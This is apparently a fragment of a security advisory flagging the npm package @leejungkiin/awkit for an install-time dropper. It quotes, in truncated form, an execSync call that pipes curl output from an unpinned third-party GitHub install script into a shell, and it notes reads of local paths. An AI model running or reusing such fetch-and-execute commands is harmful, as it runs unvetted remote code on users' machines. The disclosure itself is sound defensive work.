  "summary": "@leejungkiin/awkit ships install-time dropper fetching and executing remote shell script from third-party GitHub repo",
  "details": "scripts/dependency-manager.js at line 107 invokes execSync('curl -fsSL https://raw.githubusercontent.com/rtk-ai/rtk/refs/heads/master/install.sh |...') to fetch and execute a shell script from a mutable branch of a third-party GitHub repository (rtk-ai/rtk) whose ownership is unrelated to the package publisher (@leejungkiin). The script also contacts https://www.rtk-ai.app and reads os.homedir(), process.platform, and local filesystem paths (scripts/dependency-manager.js lines 3-7, 34, 175-177). The bundled bin/awk.js additionally imports child_process at multiple locations alongside fetch/POST call sites. Fetching and executing code from an unpinned external branch controlled by a third party at install/require time causes attacker-controlled code from that repository to run on the installer's machine with the installer's privileges.",
